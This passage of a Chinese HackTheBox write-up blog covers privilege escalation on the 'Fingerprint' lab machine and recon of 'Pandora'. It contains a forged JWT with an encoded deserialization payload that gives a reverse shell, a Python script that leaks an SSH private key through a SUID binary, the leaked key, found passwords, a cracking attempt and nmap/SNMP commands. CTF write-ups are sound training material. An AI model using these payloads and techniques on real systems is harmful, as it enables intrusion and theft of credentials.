gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">eyJ<span class="hljs-number">0</span>eXAiOiJKV<span class="hljs-number">1</span>QiLCJhbGciOiJIUzI<span class="hljs-number">1</span><span class="hljs-symbol">NiJ9</span>.eyJ<span class="hljs-number">1</span>c<span class="hljs-number">2</span>VyIjoick<span class="hljs-number">8</span>wQUJYT<span class="hljs-symbol">nlBREZqYjIwdVlXUnRhVzR1</span>YzJWamRYS<span class="hljs-symbol">nBkSGt1</span>Yz<span class="hljs-symbol">NKakxuQnliMlpwYkdVdVZYTmxjbEJ5</span>YjJacGJHVlRkRzl<span class="hljs-number">5</span>WVdkbH<span class="hljs-symbol">NWZjRNY0</span>Fmb<span class="hljs-number">1</span>ZzQ<span class="hljs-number">0</span>FBRk<span class="hljs-number">1</span>BQVIxYzJWeWRBQWpUR<span class="hljs-number">052</span>Yl<span class="hljs-name">M5</span>aFpHMXBiaTl<span class="hljs-number">6</span>WldOMW<span class="hljs-symbol">NtbDBlUzl6</span>Y<span class="hljs-number">21</span><span class="hljs-symbol">NdmJXOWtaV3</span>d<span class="hljs-number">2</span>VlhObG<span class="hljs-symbol">NqdDRjSE55</span>QU<span class="hljs-symbol">NGamIyMHVZV1</span>J<span class="hljs-number">0</span>Y<span class="hljs-attr">Vc0</span>dWMyVmpkWEpwZEhrdWMzSmpMbTF<span class="hljs-number">2</span>WkdWc<span class="hljs-number">0</span>xsV<span class="hljs-symbol">npaWEtVQk5</span>kejQxKzVhd<span class="hljs-number">0</span>lBQkVrQUFtbGtUQUFMW<span class="hljs-name">m1</span>sdVoyV<span class="hljs-symbol">nljSEpwYm5</span>SMEFCSk<span class="hljs-number">1</span>hbUYyWV<span class="hljs-name">M5</span>c<span class="hljs-number">1</span>lX<span class="hljs-symbol">NW5</span>MMU<span class="hljs-number">4</span>wY<span class="hljs-number">21</span>sdVp<span class="hljs-number">6</span>dE<span class="hljs-number">1</span>BQWh<span class="hljs-number">3</span>WVhOemQyOXlaSEVBZmdBRVRBQUlkWE<span class="hljs-number">5</span>sY<span class="hljs-number">201</span>aGJXV<span class="hljs-symbol">nhBSDRBQkhod0</span>FBQU<span class="hljs-symbol">NtblFBQUhFQWZnQUdkQUNRTGk0</span>dkxp<span class="hljs-symbol">NHZMaTR2</span>TGk<span class="hljs-number">0</span>dkpDaGxZMmh<span class="hljs-number">2</span>SU<span class="hljs-symbol">NKWmJVWjZZVU5</span>CZEZs<span class="hljs-symbol">NVFXNWFXR2</span>hzV<span class="hljs-number">1</span>hsQ<span class="hljs-number">2</span>FWbFlUbTlKUXpGd<span class="hljs-number">1</span><span class="hljs-symbol">NVUTBiVWxET1</span>d<span class="hljs-number">0</span>YVdGbDJaRWRPZDB<span class="hljs-number">4</span><span class="hljs-symbol">NlJYZE1</span>ha<span class="hljs-number">1</span>YzVEdwRk<span class="hljs-number">1</span>reHFSVEp<span class="hljs-symbol">NZWxFd1</span>RrUlJaMDFFTkcxTlUyTkxJaUI<span class="hljs-number">4</span>SUdKaGMyVTJOQ<span class="hljs-number">0</span>F<span class="hljs-number">0</span>Wk<span class="hljs-symbol">NCOElHSmhjMmdwTHk0</span>dUx<span class="hljs-number">5</span><span class="hljs-symbol">NHVMeTR1</span>TDJSaGRHRXZkWEJzYjJGa<span class="hljs-number">2</span><span class="hljs-symbol">N5</span>OTBaWE<span class="hljs-number">4</span>wI<span class="hljs-symbol">n0</span><span class="hljs-number">.2</span>KOkhWYqILuF<span class="hljs-number">02</span>Lfquo_<span class="hljs-number">4</span>uHDzUGT<span class="hljs-number">5</span>d<span class="hljs-number">0</span>FXY<span class="hljs-number">5</span>H<span class="hljs-number">52</span>jMbpM<br></code></pre></td></tr></table></figure><p>将得到的Cookie替换后刷新界面，开启<code>nc</code>监听，即可拿到<code>www-data</code>的shell：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>whoami<br>www-data<br></code></pre></td></tr></table></figure><h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><p>拿到一个基本的shell后尝试提权，首先上传<code>linpeas</code>后能够在数据库中拿到一个密码：</p><p><img src="/img/Fingerprint.assets/image-20220528213140937.png" alt="image-20220528213140937"></p><p><code>u_will_never_guess_this_password</code></p><p>然后在<code>home</code>目录下发现存在着<code>john</code>用户，下有<code>user.txt</code>，看起来我们是先要提权到<code>john</code>：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>ls /home<br>flask  john<br></code></pre></td></tr></table></figure><h2 id="cmatch"><a href="#cmatch" class="headerlink" title="cmatch"></a>cmatch</h2><p>翻了一下具有suid权限的二进制文件，发现有一个<code>cmatch</code>文件。</p><p><img src="/img/Fingerprint.assets/image-20220528213513611.png" alt="image-20220528213513611"></p><p>使用file命令查看文件，发现是一个用go编写的可执行文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">➤  file cmatch <br>cmatch: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, Go BuildID=g0S7smUZ4Ljbm3adlw4M/rerwBcGwNE-PzKhA00uD/bFZyY2tGMN1Pij5MJT3S/a3vHbLilzEj9Jm1HX5K5, not stripped<br></code></pre></td></tr></table></figure><h3 id="功能推断"><a href="#功能推断" class="headerlink" title="功能推断"></a>功能推断</h3><p>在不断尝试的过程中，我们可以发现它实现了一个文件匹配的功能。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch a<br><span class="hljs-title class_">Incorrect</span> number of arguments!<br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch a<br><span class="hljs-title class_">Incorrect</span> number of arguments!<br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch a a<br>open <span class="hljs-symbol">a:</span> no such file <span class="hljs-keyword">or</span> directory<br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /etc/passwd a<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">105</span><br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /etc/passwd john<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">3</span><br>www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>grep john /etc/passwd<br><span class="hljs-symbol">john:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:john</span><span class="hljs-symbol">:/home/john</span><span class="hljs-symbol">:/bin/bash</span><br></code></pre></td></tr></table></figure><p>然后同时还发现这个脚本支持正则匹配：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /etc/passwd .<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">1610</span><br></code></pre></td></tr></table></figure><p>然后看看能不能读john的私钥文件：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">www-data<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:/opt/glassfish5/glassfish/domains/domain1/config</span><span class="hljs-variable">$ </span>/usr/bin/cmatch /home/john/.ssh/id_rsa .<br><span class="hljs-title class_">Found</span> <span class="hljs-symbol">matches:</span> <span class="hljs-number">1736</span><br></code></pre></td></tr></table></figure><h3 id="exploit编写"><a href="#exploit编写" class="headerlink" title="exploit编写"></a>exploit编写</h3><p>是可以的，所以理论上我们可以通过这个脚本一步一步将<code>john</code>用户的ssh私钥读出来，编写脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> string<br><br>special_chars = <span class="hljs-string">&quot;:,-=/+ &quot;</span><br>known_chars = string.ascii_letters + string.digits + <span class="hljs-string">&quot;\n&quot;</span> + special_chars<br>key = <span class="hljs-string">&quot;^-----BEGIN&quot;</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-----BEGIN&quot;</span>, end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> known_chars:<br>            c_reg = c<br>            <span class="hljs-keyword">if</span> c <span class="hljs-keyword">in</span> special_chars:<br>                <span class="hljs-keyword">if</span> c == <span class="hljs-string">&quot; &quot;</span>:<br>                    c_reg = <span class="hljs-string">&quot;\\s&quot;</span><br>                <span class="hljs-keyword">else</span>:<br>                    c_reg = <span class="hljs-string">&quot;\\&quot;</span> + c<br>            <span class="hljs-comment"># 运行命令</span><br>            reg = <span class="hljs-string">f&#x27;/usr/bin/cmatch /home/john/.ssh/id_rsa &quot;<span class="hljs-subst">&#123;key&#125;</span><span class="hljs-subst">&#123;c&#125;</span>&quot;&#x27;</span><br>            <span class="hljs-comment"># 检查输出结果</span><br>            res = subprocess.check_output(<span class="hljs-string">f&#x27;/usr/bin/cmatch /home/john/.ssh/id_rsa &quot;<span class="hljs-subst">&#123;key&#125;</span><span class="hljs-subst">&#123;c_reg&#125;</span>&quot;&#x27;</span>, shell=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">if</span> res == <span class="hljs-string">b&quot;Found matches: 1\n&quot;</span>:<br>                <span class="hljs-comment"># 拼接</span><br>                key = key + c_reg<br>                <span class="hljs-built_in">print</span>(c, end=<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">break</span><br><br></code></pre></td></tr></table></figure><p>这里建议是先将cmatch这个文件拖下来在本地进行测试和代码测试，这样会快一些。</p><p>测试通过后将文件上传到靶机上然后运行，结果如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs awk">www-data@fingerprint:<span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>domains<span class="hljs-regexp">/domain1/</span>config$ python test.py<br>-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----<br>Proc-Type: <span class="hljs-number">4</span>,ENCRYPTED<br>DEK-Info: AES-<span class="hljs-number">128</span>-CBC,C310F9D86AE7CB5EA10046F9A215F423<br><br>ysiTr753RYpx1qkFJRvge/Dtu7rMEocAuCchOzAUgw9MqyPuI5M9m6KTvdB2E+SC<br>KI8IlmSbAAu0obdwTOuKD0QDGCMlXadI91WKkhALiLuw0JsxuviTqkjy/xQOJYu+<br>T4VCRI8vZoc5lfGRXnVsOJmrfTWc8f43YSD+j8dOFvdkHi0ud7xSQfqKyhDVsRyO<br><span class="hljs-number">6</span>qM2v5RnBJBktl7vwftG5vyk5vZjmx2u5BXTksuBrMUF2iZVtsoQ59L70CtIXP0M<br>g5HV4QZWRhSlS++i8W0GnWzCGANwiS18Z6CR4noSw80huaCIqWfwnoTXGJx91IDM<br>S79dBUPaK109+DKXZfT600JriZ8S9yvox3QuQ9KwsqTP<span class="hljs-regexp">/Iz8NqQI/</span>J5KLoivM+t4<br>DHjReKktYJQ+jLB1hA3CQDYs/kVUHdG2ThluFESVrnhJDvkyvKLxNlixighsb2+c<br><span class="hljs-number">3</span>JHnD8OvXOxrj2jl0k<span class="hljs-regexp">/DgbsfNxf3sHAl8snIiBwgEmb8Ep6CJOIQbuaPzqa2/</span>Lxt<br>FWZlHwYGnieVxX67nNdcU+<span class="hljs-number">3</span>xdfXbJX8UpYuGkKGwSiZRDHb3sMN5CtfHhU0fNybG<br><span class="hljs-number">5</span>xHn1YTwMZwHf8dKijdevMG2a8D79oaPff0XNflP+M2oz6e8RPOmkI0Wkv9EIq9X<br>IbLprBGDM8VQDHtO76u+l4DQZbMFCjCSjm+/xVtPmkCB7YhOyMOd5GqymGhxlbaS<br>OYJUBjA0TxHLtJ5+<span class="hljs-number">5</span>rptyaIwnJ82CA0jjRI3hoGfk2PAkX9LJuonnRm3/Is2u02R<br>GoYnpegyKTp5ETL1Ut5BdEle1HrCTY5EjzI+e7bwXIEVhvgwS8e6W3ZUq72CC+gb<br>PkSbQSQXQDQ3<span class="hljs-regexp">/qEN0XkpFIa7gyB/</span>GTKtlEwUSv<span class="hljs-regexp">/GxyB7lxu314/</span>Nox7Bz32sxxsc<br>EwZURAAynFhVP+Bd7eB<span class="hljs-regexp">/ws/</span>Ii2N9ENKk8ut8+<span class="hljs-number">9</span>fKFw4/<span class="hljs-number">1</span>pJDdwuof8MgdPImmEXZ<br>MPrQyMbt<span class="hljs-regexp">/7g1oAskxy3XgeuuRY76HN/</span>p2tElyBDZ4K+XWikKAnQPNkaohfjqsTJX<br>VqPsWG2f8XxMnN6gRvWQ7eibbARdFU7c0KR3ANWgQ06ysCYp+R8F4ns4+nZzp2x1<br>DJpbS55UpW9r3cjcHHjfAoEmtI80waMKMpnTmwWyPqFGQiCVJvQkQBWKpmT/W8hU<br>dexiRjth+FOMmrUcFe1sSElNFHDcKj2TKxdPW97c<span class="hljs-regexp">/afLn3E/</span>dUFDzalntY7K4A5M<br>O0F1a7M71yqaTsTEBglt1ZfVJUdogpz5rp2i77H5<span class="hljs-regexp">/gHV1/g</span>IEwLwLkUchsFpS2kC<br><span class="hljs-regexp">/ttPebUPv5Xxd/</span>qMF4c8+Qaynn9+MAnbDPz7peYH2un2n103qI4PudCjdpGW23sb<br>UOtc0lgU4S2pA8rWT3j69nesVzR6Yni5zzj2gUL6o12+jdLoGYH6x6unlSf+EnEc<br>U1jQBBJReZQ82j+e1FhxvD6WclxpNrtZxZdSyYaaLOMyI618tvvn5X63AWoNAZoT<br>sq0H1EhWic++FzpFC1QjvmWlFIA8+KUt2BL0fz7RTQTfR0EGyZnZv9Dqe6QCneIE<br>U3tpTZByfgx+MI2LIM8GXjvhUOiM6DieB2OFWsR8JRyred2qFJOjz7fX5TUl9dQv<br>-----<span class="hljs-keyword">END</span> RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure><p>但是使用该文件在登录时提示需要私钥文件的密码。</p><h2 id="爆破（失败）"><a href="#爆破（失败）" class="headerlink" title="爆破（失败）"></a>爆破（失败）</h2><p>我们可以先试试爆破。首先是<code>hashcat</code>本身是不支持爆破ssh私钥密码的，但是<code>john</code>可以。我们可以使用<code>ssh2john</code>这个脚本帮助我们将私钥文件转换成<code>john</code>支持的<code>hash</code>。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">➤  ssh2john<span class="hljs-selector-class">.py</span> id_rsa &gt; id_rsa<span class="hljs-selector-class">.hash</span> <br></code></pre></td></tr></table></figure><p>但是并没有爆破成功：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➤  john id_rsa.hash <span class="hljs-comment">--wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="hljs-keyword">Using</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">input</span> <span class="hljs-keyword">encoding</span>: UTF<span class="hljs-number">-8</span><br>Loaded <span class="hljs-number">1</span> <span class="hljs-keyword">password</span> hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH <span class="hljs-number">32</span>/<span class="hljs-number">64</span>])<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">1</span> (KDF/cipher [<span class="hljs-number">0</span>=MD5/AES <span class="hljs-number">1</span>=MD5/<span class="hljs-number">3</span>DES <span class="hljs-number">2</span>=Bcrypt/AES]) <span class="hljs-keyword">is</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br><span class="hljs-keyword">Cost</span> <span class="hljs-number">2</span> (iteration count) <span class="hljs-keyword">is</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">all</span> loaded hashes<br>Will run <span class="hljs-number">4</span> OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> <span class="hljs-keyword">or</span> Ctrl-C <span class="hljs-keyword">to</span> <span class="hljs-keyword">abort</span>, almost <span class="hljs-keyword">any</span> other key <span class="hljs-keyword">for</span> status<br><span class="hljs-number">0</span>g <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">03</span> DONE (<span class="hljs-number">2021</span><span class="hljs-number">-11</span><span class="hljs-number">-04</span> <span class="hljs-number">17</span>:<span class="hljs-number">02</span>) <span class="hljs-number">0</span>g/s <span class="hljs-number">4717</span>Kp/s <span class="hljs-number">4717</span>Kc/s <span class="hljs-number">4717</span>KC/s *<span class="hljs-number">7</span>¡Vamos!<br><span class="hljs-keyword">Session</span> completed.<br></code></pre></td></tr></table></figure><h2 id="解包-amp-搜索"><a href="#解包-amp-搜索" class="headerlink" title="解包&amp;搜索"></a>解包&amp;搜索</h2><p>在接着使用之前找到的一些密码无果后，我将目光投向了部署网站的<code>war</code>文件。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">www-data@fingerprint:<span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>domains<span class="hljs-regexp">/domain1/</span>config$ <span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -name *.war 2&gt;/</span>dev/<span class="hljs-keyword">null</span><br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>lib<span class="hljs-regexp">/install/</span>applications<span class="hljs-regexp">/metro/</span>wstx-services.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>lib<span class="hljs-regexp">/install/</span>applications/ejb-timer-service-app.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/glassfish/</span>domains<span class="hljs-regexp">/domain1/</span>applications<span class="hljs-regexp">/__internal/</span>app/app.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/mq/</span>lib/imqums.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/mq/</span>lib/imqhttp.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/mq/</span>lib/imqhttps.war<br><span class="hljs-regexp">/opt/g</span>lassfish5<span class="hljs-regexp">/javadb/</span>lib/derby.war<br></code></pre></td></tr></table></figure><p>将app.war拖下来，解包后将整个文件夹导入<code>jd-gui</code>分析，全盘搜索password等关键字后在<code>HibernateUtil.class</code>文件中找到了一个密码<code>q9Patz64fhtiVSO6Df2K</code>。</p><p><img src="/img/Fingerprint.assets/image-20220529220324228.png" alt="image-20220529220324228"></p><p>使用这个密码我们能够成功登录进john：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir">john<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>cat user.txt<br><span class="hljs-number">82</span>b92c5ae7a77e4e586a14275f259345<br>john<span class="hljs-variable">@fingerprint</span><span class="hljs-symbol">:~</span>$<br></code></pre></td></tr></table></figure><h1 id="0x03-root-txt"><a href="#0x03-root-txt" class="headerlink" title="0x03 root.txt"></a>0x03 root.txt</h1><p>靶场retired了。。做不得</p><h1 id="0x04-Summary"><a href="#0x04-Summary" class="headerlink" title="0x04 Summary"></a>0x04 Summary</h1><p>这是一个Insane难度的Linux靶机，主要考察内容如下：</p><ul><li>不严谨的302跳转的利用</li><li>路径穿越漏洞</li><li>HQL注入</li><li>XSS</li><li>Json Web Token</li><li>Java代码审计</li><li>反序列化利用</li><li>滥用二进制文件</li><li>war包分析</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
      <category>靶场</category>
      
      <category>HackTheBox</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox - Pandora</title>
    <link href="/2022/05/27/HTB/Pandora/"/>
    <url>/2022/05/27/HTB/Pandora/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Recon"><a href="#0x01-Recon" class="headerlink" title="0x01 Recon"></a>0x01 Recon</h1><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -Pn -sC -sV -v <span class="hljs-number">10.10.11.136</span><br></code></pre></td></tr></table></figure><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT   STATE SERVICE VERSION<br><span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">8.2</span>p1 Ubuntu <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)<br>| <span class="hljs-type">ssh</span>-hostkey:<br>|   <span class="hljs-type">3072</span> <span class="hljs-number">24</span>:c2:<span class="hljs-number">95</span>:a5:c3:<span class="hljs-number">0</span>b:<span class="hljs-number">3</span>f:f3:<span class="hljs-number">17</span>:<span class="hljs-number">3</span>c:<span class="hljs-number">68</span>:d7:af:<span class="hljs-number">2</span>b:<span class="hljs-number">53</span>:<span class="hljs-number">38</span> (RSA)<br>|   <span class="hljs-type">256</span> b1:<span class="hljs-number">41</span>:<span class="hljs-number">77</span>:<span class="hljs-number">99</span>:<span class="hljs-number">46</span>:<span class="hljs-number">9</span>a:<span class="hljs-number">6</span>c:<span class="hljs-number">5</span>d:d2:<span class="hljs-number">98</span>:<span class="hljs-number">2</span>f:c0:<span class="hljs-number">32</span>:<span class="hljs-number">9</span>a:ce:<span class="hljs-number">03</span> (ECDSA)<br>|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> e7:<span class="hljs-number">36</span>:<span class="hljs-number">43</span>:<span class="hljs-number">3</span>b:a9:<span class="hljs-number">47</span>:<span class="hljs-number">8</span>a:<span class="hljs-number">19</span>:<span class="hljs-number">01</span>:<span class="hljs-number">58</span>:b2:bc:<span class="hljs-number">89</span>:f6:<span class="hljs-number">51</span>:<span class="hljs-number">08</span> (ED25519)<br><span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.41</span> ((Ubuntu))<br>|<span class="hljs-type">_http</span>-title: Play | <span class="hljs-type">Landing</span><br>|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.41</span> (Ubuntu)<br>Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><h3 id="tcp-80-panda-htb"><a href="#tcp-80-panda-htb" class="headerlink" title="tcp 80 - panda.htb"></a>tcp 80 - panda.htb</h3><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/05/img/Pandora.assets/image-20220525130345967.png" alt="image-20220525130345967"></p><p>主页并没有什么好找的，除了一个看起来像是凑数的链接<a href="http://panda.htb/?fullName=aaa&amp;email=aaa@qqq.qqq&amp;phone=aaa&amp;message=aaa%EF%BC%8C%E6%B5%8B%E4%BA%86%E4%B8%80%E4%B8%8BSQLi%EF%BC%8C%E6%97%A0%E6%9E%9C%E3%80%82">http://panda.htb/?fullName=aaa&amp;email=aaa%40qqq.qqq&amp;phone=aaa&amp;message=aaa，测了一下SQLi，无果。</a></p><p>一番翻找后在主页实在找不到东西了，无奈下重新回到端口上，首先是TCP扫描全端口：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -Pn -sC -sV -v -p- <span class="hljs-number">10.10.11.136</span><br></code></pre></td></tr></table></figure><p>然后顺便扫描一下UDP端口：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sU -Pn -v <span class="hljs-number">10.10.11.136</span> --min-rate <span class="hljs-number">7500</span><br></code></pre></td></tr></table></figure><p>TCP没有找到啥，但是UDP发现开放了SNMP协议。</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-keyword">PORT</span>      STATE  SERVICE<br><span class="hljs-number">161</span>/udp   <span class="hljs-keyword">open</span>   snmp<br></code></pre></td></tr></table></figure><p>SNMP这个协议只在计算机网络课上提到过，没用过，更别说拿来做渗透了，<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp">现学</a>一波。</p><h1 id="0x02-user-txt"><a href="#0x02-user-txt" class="headerlink" title="0x02 user.txt"></a>0x02 user.txt</h1><h2 id="SNMP-Exploit"><a href="#SNMP-Exploit" class="headerlink" title="SNMP Exploit"></a>SNMP Exploit</h2><p>根据教程的指示，使用<code>snmpwalk</code>进行遍历。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">snmpwalk</span> -v <span class="hljs-number">1</span> -c public <span class="hljs-number">10.10.11.136</span> &gt; snmp.log<br></code></pre></td></tr></table></figure><p>后面发现<code>snmpwalk</code>跑太慢了，搜了一下发现msf有相同的功能，且速度快得多，也能对枚举的信息进行分析，遂切换到msf进行探测。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs 